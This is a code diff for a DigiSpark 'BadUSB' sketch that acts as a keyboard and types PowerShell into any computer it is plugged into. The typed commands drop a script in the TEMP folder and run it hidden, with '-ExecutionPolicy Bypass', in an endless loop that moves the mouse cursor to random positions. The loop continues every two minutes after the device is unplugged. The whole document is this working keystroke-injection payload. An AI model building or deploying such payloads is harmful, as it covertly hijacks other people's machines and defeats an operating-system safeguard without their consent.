@@ -19,24 +19,18 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3500);
 
-  // Write the script using a here-string
+  // Write script via here-string
   pln(PSTR("$f=\"$env:TEMP\\j.ps1\""));
   pln(PSTR("@'"));
-
-  // Load SetCursorPos from user32.dll — works from hidden/background processes
-  pln(PSTR("Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class M{[DllImport(\"user32.dll\")]public static extern bool SetCursorPos(int x,int y);}' -Language CSharp"));
-
-  // 3s when DigiSpark is plugged in (VID_16C0), 120s when unplugged
+  pln(PSTR("Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]public static extern bool SetCursorPos(int x,int y);' -Name M -Namespace W"));
   pln(PSTR("while(1){"));
-  pln(PSTR(" if(Test-Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USB\\VID_16C0'){Start-Sleep 3}"));
-  pln(PSTR(" else{Start-Sleep 120}"));
-  pln(PSTR(" [M]::SetCursorPos((Get-Random -Min 0 -Max 2560),(Get-Random -Min 0 -Max 1600))"));
+  pln(PSTR(" if(Test-Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USB\\VID_16C0'){Start-Sleep 3}else{Start-Sleep 120}"));
+  pln(PSTR(" [W.M]::SetCursorPos((Get-Random -Max 2560),(Get-Random -Max 1600))"));
   pln(PSTR("}"));
-
   pln(PSTR("'@ | sc $f"));
 
-  // Launch hidden — $f passed as separate array element so spaces in path are safe
-  pln(PSTR("Start-Process powershell -ArgumentList \"-WindowStyle\",\"Hidden\",\"-File\",$f"));
+  // -ExecutionPolicy Bypass overrides the default block on .ps1 files
+  pln(PSTR("Start-Process powershell -ArgumentList \"-ExecutionPolicy\",\"Bypass\",\"-WindowStyle\",\"Hidden\",\"-File\",$f"));
   pln(PSTR("exit"));
 }
 void loop(){DigiKeyboard.delay(1);}
